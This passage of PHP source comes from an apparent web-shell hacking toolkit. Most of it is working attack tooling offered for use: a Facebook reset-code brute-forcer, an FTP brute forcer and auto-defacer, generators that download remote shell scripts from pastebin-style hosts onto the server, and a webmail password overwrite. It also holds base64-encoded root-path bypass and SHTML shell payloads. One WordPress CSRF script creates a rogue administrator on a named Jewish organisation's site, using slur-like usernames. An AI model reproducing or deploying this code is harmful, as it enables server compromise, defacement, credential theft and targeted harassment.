<center><input type='text' size='40' name='id' value='target ID' ></center><br>
<center><textarea class='area' cols='35' rows='13' name='code'></textarea><br></center> <br>
<p><center><input type='submit' value='Crack Reset Code' name='scan'><br><br></center></p>
</form>"; 
$target = $_POST['id'];
$user = explode("\r\n", $_POST['code']); 
if($_POST['scan']) 
{ 
foreach($user as $code) 
{ 
// Curl Function ^_^
$ch = curl_init(); 
curl_setopt($ch, CURLOPT_URL, "https://m.facebook.com/recover/password?u={$id}&n={$code}&_rdr"); 
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);   
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_USERAGENT, "Chrome/35.0.1916.114"); // change this with your real useragent infos (browser & version)

$check = curl_exec($ch); 
if(eregi("password_new", $check)) //Keyword Good Response ^_^
{ 
echo "<center><b><font face='Tahoma' size='2' color='green'>{$code} => Facebook Confirmation Code Found ^_^ </font></center></b><br>"; 
} 
else 
{ 
echo "<center><b><font face='Tahoma' size='2' color='red'>{$code} => Incorrect Code Trying More...</font></center></b><br>"; 
} 
curl_close($ch); 
} 
}
}

if(isset($_GET['action']) && $_GET['action'] == 'cpnlndftpotdfr'){
echo '<center><b class="conte">
<a href="?action=mass">Mass Deface Dirs</a> -
<a href="?action=joomla">Mass Change Admin Joomla</a> -
<a href="?action=vb">Mass Change Admin vBulletin</a> -
<a href="?action=wp">Mass Change Admin Mass WordPress</a> -
<a href="?action=wpandjmlamassdfce">Wordpress & Joomla Mass Deface</a> -
<a href="?action=wrdprshtmlinj">Wordpress Index Hijack Priv8</a> -
<a href="?action=joommlallainxc">Joomla Index Changer</a> -
<a href="?action=wpidxcngrdesr">Wordpress Index Changer</a> -
<a href="?action=cpnlndftpotdfr">Cpanel & Ftp Auto Defacer</a> </center>
</b>';
echo '<br><center><span style="font-size:30px; font-family:Fredericka the Great; color:#009900">Cpanel & Ftp Auto Defacer</span><br>Coded  By Mauritania Attacker</center><br><center><img src="http://www6.0zz0.com/2014/08/20/15/449603437.png" /></center>';
echo"<table width='100%' cellspacing='0' cellpadding='0' class='tb1' >
<td width='100%' align=center valign='top' rowspan='1'><div class='hedr'> 
<td height='10' align='left' class='td1'></td></tr><tr><td 
width='100%' align='center' valign='top' rowspan='1'>
<font color='red' face='comic sans ms' size='1'><b> 
<font color='RED' face='gothic' size='3'></font><br>
<font color='white'></font>
</table>";
 
echo"<body bgcolor=black><h6 style='text-align:center'><font color=white>
<form method=post><font face=Tahoma size=2 color=#007700>
Server ip : &nbsp;<input type=text name=hi value=ip>&nbsp;
Username : &nbsp;<input type=text name=tx value=>&nbsp;
Password : &nbsp;<input type=text name=p value=><br><br>
file that you want to deface : </font><input type=text name=ph value='index.php'><br><br>
<font face=Tahoma size=2 color=#009900>Deface page url --> </font><textarea class='area' rows='1' cols='75' name='deface' value='your daface page link'></textarea><br><br>
<input type=submit name=sm value='Kill it Now' /><br>
</form>";

if(isset($_POST['sm']))
{
$ip=trim($_POST['hi']);
$u=trim($_POST['tx']);
$p=trim($_POST['p']);
$d=trim($_POST['ph']);
$df=trim($_POST['deface']);
echo "<br><font color=white size=2>";
echo "<font color=red size=3>server ip ==></font>&nbsp".$ip;
echo "<br><font color=red size=3>user ==></font> &nbsp".$u;
echo "<br><font color=red size=3>password ==></font> &nbsp".$p;
echo "<br><font color=red size=3>dirctory ==></font> &nbsp".$d;
echo "<br><font color=red size=3>deface link ==></font><br>".$df."<br>";
$dl="public_html/".$d;
$si= ftp_connect($ip);

$try= ftp_login($si,$u,$p);
if ((!$si) || (!$try))
{
echo "<br>could not connect , hope u filled out all correctly :(";
exit;
}
else
{
echo "<br>connection done XD<br>Ghost ,its time to spin this shit<br>";
}
$deface = ftp_put($si, $dl , $df, FTP_BINARY);
if ($deface)
{
echo "hell yeah page got defaced successfully >";
}
else
{
echo "Ghost try manually :(";
}
}
}


if(isset($_GET['action']) && $_GET['action'] == 'ftpbrtfrcee'){

echo "<body text='#FFFFFF' bgcolor='#000000'>
<title>FTP Brute Force</title>
<p align='center' dir='ltr'><font face='Tahoma' size='4'>[#] FTP Brute Force [#]</font></p>
<form method='POST'>
<center>
<p dir='ltr'>
<input type='text' name='ip' value='127.0.0.1'>
<input type='submit' value='BruteFTP' name='start'><br>
<textarea cols='30' rows='10' name='username'>users</textarea>
<textarea cols='30' rows='10' name='password'>pass</textarea></p>
<p><font face='Verdana' size='1'>[+] ReSulT [+]</font></p>
</form>";
@set_time_limit(0);
$ip = $_POST['ip'];
$username = explode("\n",$_POST['username']);
$password = explode("\n",$_POST['password']);
       
if($_POST['start']) {
function brute($connect,$ip,$user,$pass)
{
$connect = ftp_connect($ip) or die("Error , Maybe you were Banned From Server");
if(ftp_login($connect, $user, $pass)) {
    echo "<p dir='ltr'><font face='Tahoma' size='2'>Cracked :
<font color='#008000'>$user</font>:<font color='#008000'>$pass</font>@<font color='#008000'>$ip</font></font></p>"; }
}
       
foreach($username as $user) {
foreach($password as $pass) {
brute($connect,$ip,$user,$pass);
} }
}
echo "<p><font face='Verdana' size='1'>
+------------------------------------------------------------------------------------------------------------+</font></p>
</form>";
}
if(isset($_GET['action']) && $_GET['action'] == 'whmcskillrer'){
echo '<center><b class="conte">
<a href="?action=mysqslsls">MySQL & PostgreSql Connect</a> -
<a href="?action=cmd">Command Execution</a> -
<a href="?action=com64">Base64 Command</a> -
<a href="?action=vgrab">Config Grabber</a> -
<a href="?action=subdomainchkrezes">Subdomain Checker</a> -
<a href="?action=joomlarvrssrvetll">Joomla Reverse Server</a> -    
<a href="?action=wordddprssrrrvrse">Wordpress Reverse Server</a> -
<a href="?action=cari">Find Directory Writable/Readable</a> -
<a href="?action=zonh">Zone-h Notifier</a> -
<a href="?action=shhhshell">Shtml Command Shell</a> -
<a href="?action=beko">Back connect Simple</a> -
<a href="?action=rubybckconnnect">Ruby BackConnect</a> -
<a href="?action=prlbckacnonect">Perl BackConnect</a> -
<a href="?action=pythnonbakcncete">Python BackConnect</a> -
<a href="?action=exploit">Exploit</a> -
<a href="?action=whmcskillrer">Whcms Killer</a> -
<a href="?action=webmllllpwdchnger">Webmail Password Changer</a> -
<a href="?action=wpcdrfex">Wordpress Csrf Exploit</a>
</center>
</b>';
echo '<br><center><span style="font-size:30px; font-family:Fredericka the Great; color:#009900">Generate WHMCS KILLER Script</span><center><br>';
error_reporting(0);
echo "<form method='POST'>
<title>WHMCS KILLER GENERATOR</title>
<p align='center'> 
<img border='0' src='http://ben90.com/wp-content/uploads/2009/07/whmcs-logo.gif'></p><br>
<center><font color='green' size='2' face='shell'>Cwd&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</font><input type='text' size='40' name='zero' value=".dirname(__FILE__)." <font color='green' size='8' face='Tahoma'></font></center><br>
<center><font color='green' size='2' face='shell'>Script&nbsp;&nbsp;&nbsp;</font><input type='text' size='40' name='shell' value='http://tny.cz/cd97a082/save.php?hash=f5388dca645d5a6cda8e78c52bdf6a8b' <font color='green' size='8' face='Tahoma'></font></center><br>

<p><center><input type='submit' value='Generate Now' name='start' <font color=red' face='Tahoma, Geneva, sans-serif' style='font-size: 12pt'></font></center></p><br>";
echo "<p><center><textarea class='area' rows='12' cols='60' style='font-family: impact size: 2pt ; color: #00bb00; '>Results Will Appear Here ^_^ \n";
if($_POST['start']) {
$zero = $_POST['zero'];
$file = $_POST['shell'];

$dir = "whmcs"; 
if(file_exists($dir)) {
echo "[+] whmcs Folder Already Exist are you drunk :o xD !\n";
} else {
@mkdir($dir); {
echo "[+] whmcs Folder Has Been Created Nygga :3 !\n";
} 
}
#Generate WHMCS Script
$fopen = fopen("whmcs/whmcs.php",'w');
$shell = @file_get_contents($file);
$swrite = fwrite($fopen ,$shell);
if($swrite){
echo "WHMCS Script Has Been Downloaded : $zero/whmcs/whmcs.php \n";

} else {
echo "Can't Download Shell :( do it manually :D \n";
}
fclose($fopen);
}

echo "</textarea></center></p>";
$rt="<br><a href=whmcs/whmcs.php TARGET='_blank'><b>
Link</b></a>"; 
echo "<center><br><br><font color='#009900' size='1pt'>Click on Button Generate Now and Check link given below for WHMCS Script<br>$rt</center>";
echo '<p><center><font color="#00bb00" size="2pt">Generator Coded by Mauritania Attacker and Script Owner and Coder is RAB3OUN</font></center><br></p>';
}

if(isset($_GET['action']) && $_GET['action'] == 'webmllllpwdchnger'){
echo '<center><b class="conte">
<a href="?action=mysqslsls">MySQL & PostgreSql Connect</a> -
<a href="?action=cmd">Command Execution</a> -
<a href="?action=com64">Base64 Command</a> -
<a href="?action=vgrab">Config Grabber</a> -
<a href="?action=subdomainchkrezes">Subdomain Checker</a> -
<a href="?action=joomlarvrssrvetll">Joomla Reverse Server</a> -    
<a href="?action=wordddprssrrrvrse">Wordpress Reverse Server</a> -
<a href="?action=cari">Find Directory Writable/Readable</a> -
<a href="?action=zonh">Zone-h Notifier</a> -
<a href="?action=shhhshell">Shtml Command Shell</a> -
<a href="?action=beko">Back connect Simple</a> -
<a href="?action=rubybckconnnect">Ruby BackConnect</a> -
<a href="?action=prlbckacnonect">Perl BackConnect</a> -
<a href="?action=pythnonbakcncete">Python BackConnect</a> -
<a href="?action=exploit">Exploit</a> -
<a href="?action=whmcskillrer">Whcms Killer</a> -
<a href="?action=webmllllpwdchnger">Webmail Password Changer</a> -
<a href="?action=wpcdrfex">Wordpress Csrf Exploit</a>
</center>
</b>';
echo "<br><center><span style='font-size:30px; font-family:Fredericka the Great; color:#009900'> Webmail Pass Changer</span><br><br>
<center><form method='POST'>
<h4>Change Password webmail</h4><h4>
User : <input type='text' name='user' size='40' /><br />
Path : <input type='text' name='path' size='40'  /><br /><br /></h4>
<input type='submit' name='start' value='Change Password' />
</form></center>";
@error_reporting();
/*
@NetDevr
*/
if($_POST['start'])
{
$user = $_POST['user'];
$path = @chdir($_POST['path']);
$pass = "lov3rdns";
$lov3r = @base64_decode('JGFwcjEkdkNJWmRBXzEkRWhzcEhSWUZ4R24wcTBiZzRVeS9VLg==');
$array = @array('$user','$lov3r');
$imp = @implode(':',$array);
$dns = @file_put_contents('shadow',$imp);
if($dns)
{
echo '<h4><center>Password is <font color="red">'.$pass.'</font> .. <br />
Email is <font color="red">'.$user.'@'.$_SERVER['SERVER_NAME'].'</font><br />
Panel is <font color="red">http://webmail.'.$_SERVER['SERVER_NAME'].'</font>
Or <font color="red">http://'.$_SERVER['SERVER_NAME'].':2096</font><br />
<font color="blue">./x3</font></h4></center>';
}else
{
  echo '<h4><center>File Not Found</h4></center>';
}
 
}
echo'
<br />
<br />
<br />
<br />
<br />
<br />
<br />
<br />
<center>
<b># Discovery : r0kin</b><br />
<b># Coder     : Lov3rDns</b>
</center>';
}
if(isset($_GET['action']) && $_GET['action'] == 'wpcdrfex'){
echo '<center><b class="conte">
<a href="?action=mysqslsls">MySQL & PostgreSql Connect</a> -
<a href="?action=cmd">Command Execution</a> -
<a href="?action=com64">Base64 Command</a> -
<a href="?action=vgrab">Config Grabber</a> -
<a href="?action=subdomainchkrezes">Subdomain Checker</a> -
<a href="?action=joomlarvrssrvetll">Joomla Reverse Server</a> -    
<a href="?action=wordddprssrrrvrse">Wordpress Reverse Server</a> -
<a href="?action=cari">Find Directory Writable/Readable</a> -
<a href="?action=zonh">Zone-h Notifier</a> -
<a href="?action=shhhshell">Shtml Command Shell</a> -
<a href="?action=beko">Back connect Simple</a> -
<a href="?action=rubybckconnnect">Ruby BackConnect</a> -
<a href="?action=prlbckacnonect">Perl BackConnect</a> -
<a href="?action=pythnonbakcncete">Python BackConnect</a> -
<a href="?action=exploit">Exploit</a> -
<a href="?action=whmcskillrer">Whcms Killer</a> -
<a href="?action=webmllllpwdchnger">Webmail Password Changer</a> -
<a href="?action=wpcdrfex">Wordpress Csrf Exploit</a>
</center>
</b>';
echo "<br><center><span style='font-size:30px; font-family:Fredericka the Great; color:#009900'>Wordpress 0day CSRF All Versions</span><br>Coded By Mauritania Attacker<br></center>";
echo "<center><img border='0' src='http://www13.0zz0.com/2014/08/23/17/367667552.png'></center><br>
<input type='hidden' name='action' value='createuser'/>
<input type='hidden' name='_wpnonce_create-user' value='code'/>
<input type='hidden' name='_wp_http_referer' value='/wp-admin/user-new.php'/>
<center><input type='text' size='38' face='tahoma' name='victim' value='http://www.liguedefensejuive.com'/><font color='#00bb00'> Target Website</center></font><br>
<center><input type='text' size='30' face='tahoma' name='user_login' value='yehudikalb'/> Choose Username To Add</center><br>
<input type='hidden' name='email' value='zigribambou4@hotmail.fr'/>
<input type='hidden' name='first_name' value='kalb'/>
<input type='hidden' name='last_name' value='yehudi'/>
<input type='hidden' name='url' value='http://google.co.il'/>
<center><input type='text' size='30' face='tahoma' name='pass1' value='lolo133*'/> Choose Password To Add</center><br>
<center><input type='text' size='30' face='tahoma' name='pass2' value='lolo133*'/> Confirm Password To Add</center></p><br>
<input type='hidden' name='role' value='administrator'/>
<input type='hidden' name='createuser' value='Add+New+User+'/>
<center><textarea class='area' cols='43' rows='6' id='ghost' name='code'></textarea><br><br></center> 
<p><center><input type='submit' value='Inject wpnonce Token' name='scan'><br><br></center></p>
</form>";

if(isset($_POST)  && !empty($_POST)){

$victim = $_POST['victim'];
$user_login = $_POST['user_login'];
$pass1 = $_POST['pass1'];
$pass2 = $_POST['pass2'];
$curl="http://www.liguedefensejuive.com/wp-admin/user-new.php";
$_wpnonce_create = explode("\n",$_POST['_wpnonce_create-user']);



$user = explode("\r\n", $_POST['code']); 
    if($_POST['scan']) 
{ 
    foreach($_wpnonce_create as $code) 
    {
    
 
function brute($code) {
global $victim,$user_login,$pass1,$pass2,$ch,$curl;

$ch = curl_init(); 
curl_setopt($ch,CURLOPT_URL,"$victim/wp-admin/user-new.php");
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); 
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_USERAGENT, "Chrome/35.0.1916.114"); 
curl_setopt($ch,CURLOPT_POSTFIELDS,"user=$user_login&passi=$pass1&passii=$pass2&_wpnonce_create=code=&redirect_to=.$victim./author/$user_login");

$check = curl_exec($ch);
if(eregi('$user_login',$check)) {
			echo "<p><font face='Verdana' size='1'>[+] Username Has Been Successfully Added  : <font color='#008000'>$user_login = $victim</font></p>";
		}
		
		else 
            { 
                echo "<font face='Tahoma' size='2' color='red'> => Incorrect Code Trying More...</font><br>"; 
            } 
			}

	foreach($user_login as $user) {
	foreach($pass1 as $passi) {
	foreach($pass2 as $passii) {
	brute($code);
		} } } 


curl_close($ch); 
} 
} }
}
if(isset($_GET['action']) && $_GET['action'] == 'rootshelleexecbpass'){
echo '<center><b class="conte">
<a href="?action=grasy">Bypass /etc/passwd</a> -
<a href="?action=nemcon">Bypass Users Server</a> -
<a href="?action=cgipl">Bypass Perl Security</a> -
<a href="?action=bypsrootwzp">Bypass With Zip File</a> -
<a href="?action=bforb">Bypass system function</a> -
<a href="?action=rootexecbpass">Bypass With exec Function</a> -
<a href="?action=rootshelleexecbpass">Bypass With shell_exec</a> -
<a href="?action=posget">Bypass posix_getpwuid</a> -
<a href="?action=suphp">Bypass PHP Suhosin function blacklist</a> -
<a href="?action=suppet">Bypass Functions suPHP_ConfigPath</a> -
<a href="?action=setphr">Bypass suPHP Security</a> -
<a href="?action=simpelb">Simple Bypasser</a> -
<a href="?action=ritf">Read Files</a> -
<a href="?action=baidir">Bypass Chmod Directory</a> -
<a href="?action=forb14">Bypass Forbidden 2014</a> -
<a href="?action=smod14">Bypass SafeMode 2014 Priv8</a> </center>
</b>';

echo '<br><center><span style="font-size:30px; font-family:Fredericka the Great; color:#009900">Bypass Root Path With shell_exec Function</span><center><br>';
mkdir('shellexcexce', 0755);
chdir('shellexcexce');
$shellexcexce = 'PGhlYWQ+DQo8dGl0bGU+QnlwYXNzIEJ5cGFzcyBSb290IFBhdGggYnkgTWF1cml0YW5pYSBBdHRhY2tlcjwvdGl0bGU+DQo8L2hlYWQ+PGxpbmsgcmVsPSJzaG9ydGN1dCBpY29uIiBocmVmPSJodHRwOi8vd3d3Lmljb25qLmNvbS9pY28vYy91L2N1MWJtcGdiMWsuaWNvIiB0eXBlPSJpbWFnZS94LWljb24iIC8+DQo8c3R5bGUgdHlwZT0idGV4dC9jc3MiPjwhLS0gYm9keSB7YmFja2dyb3VuZC1jb2xvcjogdHJhbnNwYXJlbnQ7IGZvbnQtZmFtaWx5OkNvdXJpZXIJbWFyZ2luLWxlZnQ6IDBweDsgbWFyZ2luLXRvcDogMHB4OyB0ZXh0LWFsaWduOiBjZW50ZXI7IE5ldztmb250LXNpemU6MTJweDtjb2xvcjojMDA4ODAwO2ZvbnQtd2VpZ2h0OjQwMDt9IGF7dGV4dC1kZWNvcmF0aW9uOm5vbmU7fSBhOmxpbmsge2NvbG9yOiMwMDk5MDA7fSBhOnZpc2l0ZWQge2NvbG9yOiMwMDg4MDA7fSBhOmhvdmVye2NvbG9yOiMwMGJiMDA7fSBhOmFjdGl2ZSB7Y29sb3I6IzAwOTkwMDt9IC0tPjwhLS0gTWFkZSBCeSBNYXVyaXRhbmlhIEF0dGFja2VyIC0tPg0KPC9zdHlsZT48YnI+PGJyPjxib2R5IGJnQ29sb3I9IjAwMDAwMCI+PHRyPjx0ZD48P3BocCBlY2hvICI8Zm9ybSBtZXRob2Q9J1BPU1QnIGFjdGlvbj0nJz4iIDsgDQplY2hvICI8Y2VudGVyPjxpbnB1dCB0eXBlPSdzdWJtaXQnIHZhbHVlPSdCeXBhc3MgaXQnIG5hbWU9J3NoZWxsX2V4ZWNlcic+PC9jZW50ZXI+IjsgDQppZiAoaXNzZXQoJF9QT1NUWydzaGVsbF9leGVjZXInXSkpeyBzaGVsbF9leGVjKCdsbiAtcyAvIHJvb3Qtc2hlbGxfZXhlYy50eHQnKTsgDQokZnZja2VtID0nVDNCMGFXOXVjeUJKYm1SbGVHVnpJRVp2Ykd4dmQxTjViVXhwYm10ekRRcEVhWEpsWTNSdmNubEpibVJsZUNCemMzTnpjM011YUhSdERRcEJaR1JVZVhCbElIUjRkQ0F1Y0dod0RRcEJaR1JJWVc1a2JHVnlJSFI0ZENBdWNHaHcnOyANCiRmaWxlID0gZm9wZW4oIi5odGFjY2VzcyIsIncrIik7ICR3cml0ZSA9IGZ3cml0ZSAoJGZpbGUgLGJhc2U2NF9kZWNvZGUoJGZ2Y2tlbSkpOyAkc2hlbGxfZXhlY2VyID0gc3ltbGluaygiLyIsInJvb3Qtc2hlbGxfZXhlYy50eHQiKTsgDQokcnQ9Ijxicj48YSBocmVmPXJvb3Qtc2hlbGxfZXhlYy50eHQgVEFSR0VUPSdfYmxhbmsnPjxmb250IGNvbG9yPSMwMGJiMDAgc2l6ZT0yIGZhY2U9J0NvdXJpZXIgTmV3Jz48Yj5CeXBhc3NlZCBTdWNjZXNzZnVsbHk8L2I+PC9mb250PjwvYT4iOyANCmVjaG8gIjxicj48YnI+PGI+RG9uZS4uICE8L2I+PGJyPjxicj5DaGVjayBsaW5rIGdpdmVuIGJlbG93IGZvciAvIGZvbGRlciBzeW1saW5rIDxicj4kcnQ8L2NlbnRlcj4iO30gZWNobyAiPC9mb3JtPiI7ICA/PjwvdGQ+PC90cj48L2JvZHk+PC9odG1sPg==';

$file = fopen("shellexcexce.php" ,"w+");
$write = fwrite ($file ,base64_decode($shellexcexce));
fclose($file);
chmod("shellexcexce.php",0755);
echo "<iframe src=shellexcexce/shellexcexce.php width=60% height=60% frameborder=0></iframe>";
}
if(isset($_GET['action']) && $_GET['action'] == 'subdomainchkrezes'){
echo '<center><b class="conte">
<a href="?action=mysqslsls">MySQL & PostgreSql Connect</a> -
<a href="?action=cmd">Command Execution</a> -
<a href="?action=com64">Base64 Command</a> -
<a href="?action=vgrab">Config Grabber</a> -
<a href="?action=subdomainchkrezes">Subdomain Checker</a> -
<a href="?action=joomlarvrssrvetll">Joomla Reverse Server</a> -    
<a href="?action=wordddprssrrrvrse">Wordpress Reverse Server</a> -
<a href="?action=cari">Find Directory Writable/Readable</a> -
<a href="?action=zonh">Zone-h Notifier</a> -
<a href="?action=shhhshell">Shtml Command Shell</a> -
<a href="?action=beko">Back connect Simple</a> -
<a href="?action=rubybckconnnect">Ruby BackConnect</a> -
<a href="?action=prlbckacnonect">Perl BackConnect</a> -
<a href="?action=pythnonbakcncete">Python BackConnect</a> -
<a href="?action=exploit">Exploit</a> -
<a href="?action=whmcskillrer">Whcms Killer</a> -
<a href="?action=webmllllpwdchnger">Webmail Password Changer</a> -
<a href="?action=wpcdrfex">Wordpress Csrf Exploit</a>
</center>
</b>';
echo '<br><center><span style="font-size:30px; font-family:Fredericka the Great; color:#009900">Subdomain Checker</span><center><br>';
echo'<html><body><center></br>
<form method="post">
<input type="text" name="site" size="30" placeholder="Example.com">
<input type="submit" value="Bypass">
</form>
</font>';


set_time_limit(0);
$subs = array("a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","lan","phpmyadmin","administrator","mape","isp","shop","rex","podcast","potraga","sensation","igre","foo","api","access","ulaz","pam","sport","pretraga","pricaonica","kuvar","raketa","wwwmobile","s1","s2","foro","s3","box","open","abc","phpbb3","phpbb2","internet","phpbb","whm","mysql","webadmin","adm","admin","admins","agent","aix","recnik","alerts","av","antivirus","app","apps","appserver","archive","as400","auto","backup","banking","bbdd","bbs","bea","beta","blog","catalog","cgi","channel","channels","chat","cisco","client","clients","club","cluster","clusters","code","commerce","community","compaq","conole","consumer","contact","contracts","corporate","ceo","cso","cust","customer","cpanel","data","bd","db2","default","demo","cms","design","desktop","dev","develop","developer","device","dial","digital","dir","directory","disc","discovery","disk","dns","dns1","dns2","dns3","docs","poslovi","prijemni","znanje","mojtim","documents","domain","domains","dominoweb","download","downloads","ecommerce","e-commerce","edi","edu","education","email","enable","engine","engineer","enterprise","slike","galerija","error","event","events","example","exchange","extern","external","extranet","fax","field","finance","firewall","forum","forums","fsp","ftp","ftp2","fw","fw1","gallery","galleries","games","gateway","gopher","guest","gw","hello","helloworld","help","helpdesk","arkiva","lajme","faqe","helponline","hp","ibm","ibmdb","ids","ILMI","film","navigator","nalog","prodavnica","zdravlje","reklamiranje","zivot","images","imap","pomoc","imap4","img","imgs","info","intern","internal","intranet","invalid","iphone","ipsec","irc","ircserver","jobs","ldap","link","linux","lists","listserver","local","localhost","log","logs","login","lotus","mail","mailboxes","mailhost","result","management","manage","manager","map","maps","marketing","device","media","member","members","messenger","mngt","mobile","monitor","multimedia","music","my","names","lojra","albania","bisedo","puka","foto","emra","njohje","vip","egea-tirana","historia","forumi","vesti","administracija","net","new1","new","perkohesisht","netdata","netstats","network","news","nms","nntp","ns","ns1","ns2","ns3","ntp","online","openview","oracle","outlook","page","pages","partner","partners","pda","personal","ph","pictures","pix","pop","pop3","portal","press","print","printer","private","project","projects","proxy","public","ra","radio","raptor","ras","read","register","remote","report","reports","root","router","lister","rwhois","sac","schedules","scotty","search","secret","secure","security","seri","serv","serv2","server","service","services","shop","shopping","site","sms","smtp","smtphost","snmp","snmpd","snort","solaris","1","2","3","4","5","6","7","8","9","0","solutions","support","source","sql","ssl","stats","store","stream","streaming","sun","support","switch","sysback","system","tech","terminal","test","testing","testing123","time","tivoli","training","transfers","uddi","update","upload","uploads","video","vpn","w1","w2","w3","wais","wap","web","webdocs","weblib","weblogic","webmail","webserver","webservices","websphere","whois","wireless","work","world","write","ws","ws1","ws2","ws3","www1","www2","www3","www4","www5","www6","www7","www8","www9","drupal","wordpress","joomla","db","database","love");
if($_POST){
$url = $_POST["site"];
foreach($subs as $sub){
if(!eregi($url, gethostbyname($sub.".".$url))){
echo '<font face="Baskerville Old Face" color="red">[+] '.$sub.".".$url.' : </font><font color="green">'.gethostbyname($sub.".".$url).'</font></br>';
}else{
echo '<font face="Baskerville Old Face" color="red">[+] '.$sub.".".$url.' : Nothing Found</font></br>';
}
}
}
}
echo'</body></html>';
if(isset($_GET['action']) && $_GET['action'] == 'wpidxcngrdesr'){
echo '<center><b class="conte">
<a href="?action=mass">Mass Deface Dirs</a> -
<a href="?action=joomla">Mass Change Admin Joomla</a> -
<a href="?action=vb">Mass Change Admin vBulletin</a> -
<a href="?action=wp">Mass Change Admin WordPress</a> -
<a href="?action=wpandjmlamassdfce">Wordpress & Joomla Mass Deface</a> -
<a href="?action=wrdprshtmlinj">Wordpress Index Hijack Priv8</a> -
<a href="?action=joommlallainxc">Joomla Index Changer</a> -
<a href="?action=wpidxcngrdesr">Wordpress Index Changer</a> -
<a href="?action=cpnlndftpotdfr">Cpanel & Ftp Auto Defacer</a> </center>
</b>';
echo '<br><center><span style="font-size:30px; font-family:Fredericka the Great; color:#009900">Generate Wordpress Index Changer</span></font></center><br>';
error_reporting(0);
echo "<form method='POST'><p align='center'> 
<img border='0' src='http://blog.numericube.com/wp-content/uploads/2010/06/wordpress-logo-notext-bg.png'></p>
<center><font color='#777777' size='2' face='shell'>Cwd&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</font><input type='text' size='40' name='zero' value=".dirname(__FILE__)." <font color='green' size='8' face='Tahoma'></font></center>
<center><font color='#777777' size='2' face='shell'>Script&nbsp;&nbsp;&nbsp;</font><input type='text' size='40' name='shell' value='http://pastebin.com/raw.php?i=6kFhLVkS' <font color='green' size='8' face='Tahoma'></font></center><br>
<p><center><input type='submit' value='&nbsp;&nbsp;Generate Now&nbsp;&nbsp;' name='start'> <font color=red' face='Tahoma, Geneva, sans-serif' style='font-size: 12pt'><br></font></center></p><br>";
echo "<p><center><textarea class='area' rows='12' cols='60'>Results Will Appear Here ^_^ \n";
if($_POST['start']) {
$zero = $_POST['zero'];
$file = $_POST['shell'];

$dir = "Wordpress"; 
if(file_exists($dir)) {
echo "[+] Wordpress Folder Already Exist are you drunk :o xD !\n";
} else {
@mkdir($dir); {
echo "[+] Wordpress Folder Has Been Created Nygga :3 !\n";
} 
}
#Generate Wordpress Script
$fopen = fopen("Wordpress/Wordpress.php",'w');
$shell = @file_get_contents($file);
$swrite = fwrite($fopen ,$shell);
if($swrite){
echo "Wordpress Script Has Been Downloaded : $zero/Wordpress/Wordpress.php \n";

} else {
echo "Can't Download Script :( do it manually :D \n";
}
fclose($fopen);
}

echo "</textarea></center></p><pre></pre>";
$rt="<br><a href=Wordpress/Wordpress.php TARGET='_blank'><font color=red size=2 face='Courier New'><b>
Link</b></font></a>"; 
echo "<center><br><font color='#007700' size='2pt'>Click on Button Generate Now and Check link given below for Wordpress Script</font><br>$rt</center>";
echo '<p><center><font color="#007700" size="3pt">Generator Coded by Mauritania Attacker</font></center><br></p>';
}

if(isset($_GET['action']) && $_GET['action'] == 'shhhshell'){
echo '<center><b class="conte">
<a href="?action=mysqslsls">MySQL & PostgreSql Connect</a> -
<a href="?action=cmd">Command Execution</a> -
<a href="?action=com64">Base64 Command</a> -
<a href="?action=vgrab">Config Grabber</a> -
<a href="?action=subdomainchkrezes">Subdomain Checker</a> -
<a href="?action=joomlarvrssrvetll">Joomla Reverse Server</a> -    
<a href="?action=wordddprssrrrvrse">Wordpress Reverse Server</a> -
<a href="?action=cari">Find Directory Writable/Readable</a> -
<a href="?action=zonh">Zone-h Notifier</a> -
<a href="?action=shhhshell">Shtml Command Shell</a> -
<a href="?action=beko">Back connect Simple</a> -
<a href="?action=rubybckconnnect">Ruby BackConnect</a> -
<a href="?action=prlbckacnonect">Perl BackConnect</a> -
<a href="?action=pythnonbakcncete">Python BackConnect</a> -
<a href="?action=exploit">Exploit</a> -
<a href="?action=whmcskillrer">Whcms Killer</a> -
<a href="?action=webmllllpwdchnger">Webmail Password Changer</a> -
<a href="?action=wpcdrfex">Wordpress Csrf Exploit</a>
</center>
</b>';

//extract shtml shell
$ROFL = 'PCEtLSNjb25maWcgZXJybXNnPSJbRXJyb3IsIE1heWJlIGNhdXNlIG9mIHRoZSBzZWN1cml0eSBvZiB0aGUgc2VydmVyIDooXSItLT4gIA0KPCEtLSNjb25maWcgc2l6ZWZtdD0iYnl0ZXMiLS0+ICANCg0KPCEtLSNpZiBleHByPSIoXCIkSFRUUF9DT09LSUVcIiA9IFwiXCIpIHx8IChcIiRSRVFVRVNUX01FVEhPRFwiICE9IFwiR0VUXCIpIiAtLT4gIA0KICAgIDwhLS0jc2V0IHZhcj0ic2hsIiB2YWx1ZT0ibHMgLWFsIiAtLT4gIA0KPCEtLSNlbHNlIC0tPiAgDQogICAgPCEtLSNzZXQgdmFyPSJzaGwiIHZhbHVlPSRIVFRQX0NPT0tJRSAtLT4gIA0KPCEtLSNlbmRpZiAtLT4gIA0KDQo8IS0tI2lmIGV4cHI9IihcIiRIVFRQX0NPT0tJRVwiID0gXCJcIikgfHwgKFwiJFJFUVVFU1RfTUVUSE9EXCIgIT0gXCJQT1NUXCIpIiAtLT4gIA0KICAgIDwhLS0jc2V0IHZhcj0iaW5jIiB2YWx1ZT0iLy4uLy4uLy4uLy4uLy4uLy4uLy4uL2V0Yy9wYXNzd2QiIC0tPiAgDQo8IS0tI2Vsc2UgLS0+ICANCiAgICA8IS0tI3NldCB2YXI9ImluYyIgdmFsdWU9JEhUVFBfQ09PS0lFIC0tPiAgDQo8IS0tI2VuZGlmIC0tPiAgDQo8aHRtbD4gDQo8aGVhZD4gDQo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LUxhbmd1YWdlIiBjb250ZW50PSJlbi11cyI+IA0KPG1ldGEgY2hhcnNldD0iVVRGLTgiLz4gDQo8dGl0bGU+U2h0bWwgQ2dpIFNoZWxs